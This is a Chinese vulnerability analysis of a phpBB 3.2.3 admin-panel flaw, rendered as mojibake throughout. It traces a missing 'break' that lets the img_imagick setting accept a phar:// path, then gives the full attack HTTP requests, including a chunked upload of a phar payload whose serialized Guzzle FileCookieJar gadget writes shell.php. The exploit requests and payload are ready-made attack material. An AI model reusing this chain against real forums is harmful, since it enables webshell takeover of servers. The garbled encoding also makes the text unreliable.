phpBBâ„¢ å·²ç»æˆä¸ºä¸–ç•Œä¸Šåº”ç”¨æœ€å¹¿æ³›çš„å¼€æºè®ºå›è½¯ä»¶
åœ¨phpBB
v3.2.3åŠä»¥å‰çš„ç‰ˆæœ¬ä¸­ï¼Œæ§åˆ¶ç®¡ç†é¢æ¿è®¾ç½®è·¯å¾„çš„`$_REQUEST['config']`å‚æ•°è¿‡æ»¤ä¸ä¸¥æ ¼ï¼Œå’Œä¸ä¸¥è°¨çš„`switch`è¯­å¥ï¼Œå¼•å‘è·å–webshellçš„ä¸¥é‡å®‰å…¨é—®é¢˜ã€‚
# æ¼æ´ç®€ä»‹
æ”»å‡»è€…è‹¥é€šè¿‡ç¤¾å·¥ï¼Œå¼±å£ä»¤ï¼Œé’“é±¼ç­‰æ–¹å¼æ‹¥æœ‰æ§åˆ¶ç®¡ç†é¢æ¿æƒé™ï¼Œå¯å…ˆå‰å°ä¸Šä¼ æ¶æ„é™„ä»¶ï¼Œå†è¿›å…¥åå°æ§åˆ¶ç®¡ç†é¢æ¿åˆ©ç”¨è®¾ç½®ä¸­å¯¹è·¯å¾„çš„éªŒè¯çš„åŠŸèƒ½ï¼Œç»“åˆPHP phar
ååºåˆ—åŒ–è¿›è¡Œphpå¯¹è±¡æ³¨å…¥ï¼Œæ„é€ å¯ç”¨çš„æ¶æ„æ”»å‡»é“¾ï¼Œè·å–Webshellã€‚
# æ¼æ´æ¡ä»¶
  * phpBB v3.2.3åŠä»¥å‰çš„ç‰ˆæœ¬
  * è¿›å…¥æ§åˆ¶ç®¡ç†é¢æ¿çš„æƒé™
# æ¼æ´è¯¦æƒ…
## æ¼æ´å…³é”®
å…ˆçœ‹è§¦å‘php pharååºåˆ—åŒ–æ¼æ´çš„æ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼š
æ–‡ä»¶ä½ç½®ï¼š`phpBB3/includes/functions_acp.php::validate_config_vars`
é€šè¿‡`file_exists`å‡½æ•°åˆ¤æ–­`$path`æ˜¯å¦å­˜åœ¨ï¼Œæ­¤å¤„è‹¥å¯ä»¥è¢«æˆ‘ä»¬ä¸Šä¼ PHARå½’æ¡£åŒ…ï¼Œæ–‡ä»¶è·¯å¾„è‹¥è¢«æˆ‘ä»¬å¯çŸ¥å¯æ§ï¼Œå°±å¯ä»¥é€šè¿‡`phar://`åè®®è¿›è¡Œååºåˆ—åŒ–æ”»å‡»ã€‚
## æ¼æ´åˆ†æ
### è§¦å‘ç‚¹åˆ†æ
é¦–å…ˆæ˜¯è½½å…¥çš„æ—¶å€™è°ƒç”¨`acp_attachments->main()`æ–¹æ³•
æ–‡ä»¶ä½ç½®ï¼š`phpBB3/includes/acp/acp_attachments.php`
å…³é”®å‡½æ•°ä¸º`validate_config_vars`å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸º`$display_vars['vars']`æ¥è‡ªä¸Šæ–‡çš„ç³»ç»Ÿé…ç½®å®šä¹‰ï¼š
ç¬¬äºŒä¸ªå‚æ•°é€šè¿‡`$_REQUEST`æ¥æ”¶ï¼Œpostå‘é€æ•°ç»„å‚æ•°`config`ï¼Œè¢«èµ‹å€¼æˆä¸º`$cfg_array`
ä¸¤ä¸ªå‚æ•°ä¼ å…¥`validate_config_vars`å‡½æ•°ï¼Œç»§ç»­è·Ÿè¿›ã€‚
æ–‡ä»¶ä½ç½®ï¼š`phpBB3/includes/functions_acp.php`
è¿›å…¥å‡½æ•°åä½¿ç”¨`foreach`å¯¹`$config_vars`è¿›è¡Œéå†ï¼Œé”®åä¸º`$config_name`ï¼Œé”®å€¼ä¸º`$config_definition`ã€‚
å…ˆå¯¹`$cfg_array`è¿›è¡Œåˆ¤æ–­ï¼Œä¹Ÿå°±æ˜¯postæ•°ç»„ä¸­å¿…é¡»æœ‰å’Œç³»ç»Ÿé…ç½®æ•°ç»„ç›¸åŒçš„é”®åçš„æ•°ç»„ï¼›ç„¶ååˆå¯¹é”®å€¼çš„åˆ¤æ–­æ˜¯å¦å­˜åœ¨`$config_definition['validate']`ã€‚ä¸¤ä¸ªæ¡ä»¶éœ€è¦åŒæ—¶æ»¡è¶³ï¼Œä¸æ»¡è¶³å°±è·³è¿‡æ­¤å˜é‡å¾ªç¯ï¼Œå­˜åœ¨å°±å¯¹`$config_definition['validate']`è¿›è¡Œåˆ†å‰²ä¸ºæ•°ç»„ï¼Œå¹¶å–ç¬¬0ä¸ªå‚æ•°ä¼ è¿›`switch`è¿›è¡ŒåŒ¹é…ï¼Œå¯ä»¥å‘ç°åˆ©ç”¨ç‚¹åœ¨`wpath`åˆ†æ”¯é‡Œï¼š
æ»¡è¶³ä¸Šæ–‡ä¸¤æ¡ä»¶å¹¶ä¸”`$validator[$type]==wpath`æ‰èƒ½è¿›å…¥åˆ†æ”¯ï¼Œå¯¹ç³»ç»Ÿé…ç½®æ•°ç»„è¿›è¡Œç­›é€‰ï¼Œæš‚æ—¶å‘ç°åªæœ‰é”®åä¸º`upload_path`çš„æ•°ç»„æ»¡è¶³æ¡ä»¶ã€‚
ä½†æ˜¯åœ¨è¿›å…¥è·¯å¾„åˆ¤æ–­å‰æœ‰ä¸€ä¸ªä¸‰å…ƒè¿ç®—
    $path = in_array($config_definition['validate'], array('wpath', 'path', 'rpath', 'rwpath')) ? $phpbb_root_path . $cfg_array[$config_name] : $cfg_array[$config_name];
ç»è¿‡åˆ¤æ–­`$config_definition['validate']`åœ¨æ•°ç»„ä¹‹ä¸­ï¼Œæ‰€ä»¥ä¼šèµ°ç¬¬ä¸€ä¸ªåˆ†æ”¯ï¼Œ`$cfg_array[$config_name]`å°±æ˜¯postæ•°ç»„å˜é‡ï¼Œæ­¤å¤„å¯æ§ï¼Œä½†æ˜¯ä¼šå’Œ`$phpbb_root_path`è¿›è¡Œæ‹¼æ¥ã€‚  
æ–‡ä»¶ä½ç½®ï¼š`phpBB3/adm/index.php`
å› æ­¤æ‹¼æ¥åçš„`$path`ä¼šå˜æˆ`./../xxxxxxxxxx`ï¼Œè·¯å¾„å‡ºé”™æ— æ³•åˆ©ç”¨ï¼Œå¦‚ä¸‹ã€‚
ä½†æ˜¯è¿™é‡Œçš„æ•´ä¸ª`switch`è¯­å¥çŠ¯äº†ä¸€ä¸ªè¾ƒä¸ºä½çº§çš„é”™è¯¯ï¼Œéƒ¨åˆ†æ¡ä»¶çš„è¯­å¥æ®µæ²¡æœ‰ä½¿ç”¨`break`è¿›è¡Œç»“æŸã€‚
`switch`æ‰§è¡Œæ–¹å¼ï¼šå¼€å§‹æ—¶æ²¡æœ‰ä»£ç è¢«æ‰§è¡Œã€‚ä»…å½“ä¸€ä¸ª `case`è¯­å¥ä¸­çš„å€¼å’Œ `switch`è¡¨è¾¾å¼çš„å€¼åŒ¹é…æ—¶ PHP
æ‰å¼€å§‹æ‰§è¡Œè¯­å¥ï¼Œç›´åˆ°`switch`çš„ç¨‹åºæ®µç»“æŸæˆ–è€…é‡åˆ°ç¬¬ä¸€ä¸ª`break` è¯­å¥ä¸ºæ­¢ã€‚å¦‚æœä¸åœ¨`case`çš„è¯­å¥æ®µæœ€åå†™ä¸Š`break`çš„è¯ï¼ŒPHP
å°†ç»§ç»­æ‰§è¡Œä¸‹ä¸€ä¸ª`case`ä¸­çš„è¯­å¥æ®µã€‚
å› æ­¤éœ€è¦åœ¨`$config_vars`æ‰¾åˆ°ä¸€ä¸ªå…ƒç´ `$config_definition`ï¼Œå¹¶ä¸”`$config_definition['validate']`ç­‰äº`absolute_path`æˆ–è€…`absolute_path_writable`æˆ–è€…`path`ï¼Œè¿™æ ·å°±èƒ½å³è¿›å…¥`wpath`æ‰§è¡Œä¹Ÿä¸å¢åŠ `$path`çš„å‰ç¼€
ä½¿ç”¨å¦‚ä¸‹ä»£ç è¿‡æ»¤ï¼š
    foreach ($display_vars['vars'] as $key =>$value){
        if (($value['validate'] === 'absolute_path') or ($value['validate'] === 'absolute_path_writable') or ($value['validate'] === 'path')){
            print('66'.$key.'77');
        }
    }
å‘ç°`img_imagick`å…ƒç´ æ»¡è¶³æ¡ä»¶ï¼š
è¿›å…¥æ§åˆ¶é¢æ¿çš„é™„ä»¶è®¾å®šï¼Œæäº¤å¹¶è¯¥ä¿®æ”¹æ•°æ®åŒ…
æ•°æ®åŒ…å¦‚ä¸‹ï¼Œå…³é”®ç‚¹ä¸º`config[img_imagick]`å‚æ•°ï¼š
    POST /phpBB3/adm/index.php?i=acp_attachments&mode=attach&sid=385d5172c29a3a9530d6b467a5691ffd HTTP/1.1
    Host: bugtest.com
    User-Agent: python-requests/2.21.0
    Accept-Encoding: gzip, deflate
    Accept: */*
    Connection: close
    Content-Length: 967
    config%5Ballow_attachments%5D=1&config%5Ballow_pm_attach%5D=0&config%5Bupload_path%5D=files&config%5Bdisplay_order%5D=0&config%5Battachment_quota%5D=50&attachment_quota=mb&config%5Bmax_filesize%5D=256&max_filesize=kb&config%5Bmax_filesize_pm%5D=256&max_filesize_pm=kb&config%5Bmax_attachments%5D=3&config%5Bmax_attachments_pm%5D=1&config%5Bsecure_downloads%5D=0&config%5Bsecure_allow_deny%5D=1&config%5Bsecure_allow_empty_referer%5D=1&config%5Bcheck_attachment_content%5D=1&config%5Bimg_display_inlined%5D=1&config%5Bimg_create_thumbnail%5D=0&config%5Bimg_max_thumb_width%5D=400&config%5Bimg_min_thumb_filesize%5D=12000&config%5Bimg_imagick%5D=phar://../files/plupload/c2f830acec21b6d3a45ff0f5b3f35273_5de5caf862ea58bbb27aff231f06c7f3zip.part/&config%5Bimg_max_width%5D=0&config%5Bimg_max_height%5D=0&config%5Bimg_link_width%5D=0&config%5Bimg_link_height%5D=0&submit=Submit&ips=&ipexclude=0&creation_time=1552465991&form_token=0910a5dc9a13fc50a0ead4656617642fa80daaf1
æ­¤æ—¶å·²ç»å¯ä»¥è§¦å‘ååºåˆ—åŒ–ï¼Œè¿˜éœ€ä¸Šä¼ åŒ…å«åˆ©ç”¨é“¾çš„æ¶æ„é™„ä»¶ã€‚
### ä¸Šä¼ æ¶æ„é™„ä»¶
ä¸Šä¼ ä½ç½®ä¸ºå‰å°å‘å¸–é™„ä»¶å¤„:
å¤„ç†æ–‡ä»¶ä¸Šä¼ çš„å…³é”®å‡½æ•°ï¼Œä»¥åŠå‡½æ•°è°ƒç”¨æ ˆï¼š
æ–‡ä»¶ä½ç½®ï¼šphpBB3/phpbb/plupload/plupload.php
åœ¨è¿™é‡Œå‡½æ•°handle_uploadå¯ä»¥å®ç°å¤šä¸ª`chunk`å¤„ç†ã€‚`$this->request->variable`å‡½æ•°æ ¹æ®é”®åä»è¯·æ±‚ä¸­è·å–å€¼ï¼Œé¦–å…ˆè·å–`chunks`çš„å€¼ï¼Œå¹¶åˆ¤æ–­`chunk`æ˜¯å¦å°äº2ï¼Œå¦‚æœå°äºå°±ç›´æ¥è¿”å›ï¼Œå¦‚æœå¤§äºå°±å¼€å§‹è¿›è¡Œå¤š`chunk`å¤„ç†ã€‚
ç„¶åè¿›å…¥å…³é”®çš„`temporary_filepath`å‡½æ•°ï¼š
è¿™ä¸ªå°±æ˜¯è®¡ç®—ä¸Šä¼ æ–‡ä»¶è·¯å¾„çš„å‡½æ•°ï¼Œ`$this->temporary_directory`å¯çŸ¥ä¸º`./files/plupload`ï¼Œ`$file_name`å¯æ§ï¼Œ`\phpbb\files\filespec::get_extension($file_name)`è·å–æ–‡ä»¶çš„åç¼€åŒæ ·å¯æ§ï¼Œæ¯”è¾ƒéº»çƒ¦çš„æ˜¯`$this->config['plupload_salt']`å­˜åœ¨äºæ•°æ®åº“ä¸­ï¼Œä½†å¯ä»¥åœ¨ç®¡ç†é¢æ¿ä¸­é€šè¿‡å¤‡ä»½è¿›è¡Œè·å–ã€‚
`plupload_salt`å¦‚ä¸‹
æ­¤æ—¶å·²ç»å®Œå…¨å¯ä»¥è®¡ç®—è·¯å¾„
    ./files/plupload/c2f830acec21b6d3a45ff0f5b3f35273_5de5caf862ea58bbb27aff231f06c7f3zip
ç„¶åè¿›å…¥å‡½æ•°è¿›è¡Œæ–‡ä»¶å†™å…¥
ä¸­é€”ä¼šäº§ç”Ÿä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œä½†åé¢ä¼šåˆ é™¤ï¼Œæœ€åæ–‡ä»¶åè¿˜ä¼šå¢åŠ `.part`åç¼€ã€‚
    ./files/plupload/c2f830acec21b6d3a45ff0f5b3f35273_5de5caf862ea58bbb27aff231f06c7f3zip.part
æ”»å‡»æ•°æ®åŒ…å¦‚ä¸‹ï¼š
    POST /phpBB3/posting.php?mode=post&f=2&sid=a3f8b226bd4ad508d8838284c0cfc332 HTTP/1.1
    Host: bugtest.com
    Content-Length: 1909
    Origin: http://bugtest.com
    x-requested-with: XMLHttpRequest
    x-phpbb-using-plupload: 1
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryuHMhmTMPyBMwbiEg
    Accept: */*
    Referer: http://bugtest.com/phpBB3/posting.php?mode=post&f=2&sid=52c63bf06fdeaef60de9b8fba1de97ad
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    ------WebKitFormBoundaryuHMhmTMPyBMwbiEg
    Content-Disposition: form-data; name="name"
    rai4over.zip
    ------WebKitFormBoundaryuHMhmTMPyBMwbiEg
    Content-Disposition: form-data; name="chunk"
    0
    ------WebKitFormBoundaryuHMhmTMPyBMwbiEg
    Content-Disposition: form-data; name="chunks"
    3
    ------WebKitFormBoundaryuHMhmTMPyBMwbiEg
    Content-Disposition: form-data; name="add_file"
    Add the file
    ------WebKitFormBoundaryuHMhmTMPyBMwbiEg
    Content-Disposition: form-data; name="real_filename"
    payload.phar.zip
    ------WebKitFormBoundaryuHMhmTMPyBMwbiEg
    Content-Disposition: form-data; name="attachment_data[0][attach_id]"
    16
    ------WebKitFormBoundaryuHMhmTMPyBMwbiEg
    Content-Disposition: form-data; name="attachment_data[0][is_orphan]"
    1
    ------WebKitFormBoundaryuHMhmTMPyBMwbiEg
    Content-Disposition: form-data; name="attachment_data[0][real_filename]"
    payload.zip
    ------WebKitFormBoundaryuHMhmTMPyBMwbiEg
    Content-Disposition: form-data; name="attachment_data[0][attach_comment]"
    ------WebKitFormBoundaryuHMhmTMPyBMwbiEg
    Content-Disposition: form-data; name="attachment_data[0][filesize]"
    35802
    ------WebKitFormBoundaryuHMhmTMPyBMwbiEg
    Content-Disposition: form-data; name="fileupload"; filename="payload.phar.zip"
    Content-Type: application/zip
Ã•O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:41:"GuzzleHttp\Cookie\FileCookieJarfilename";s:42:"/Applications/MAMP/htdocs/phpBB3/shell.php";s:52:"GuzzleHttp\Cookie\FileCookieJarstoreSessionCookies";b:1;s:36:"GuzzleHttp\Cookie\CookieJarcookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:33:"GuzzleHttp\Cookie\SetCookiedata";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:18:"";}}}s:39:"GuzzleHttp\Cookie\CookieJarstrictMode";N;}test.txtÃ¶Ã¬Âˆ\
~Ã˜Â¶testÂ¨~ÃªÂ’Ã·z]ÂÂ©Ã¤gÂÂÂ­4GBMB
    ------WebKitFormBoundaryuHMhmTMPyBMwbiEg--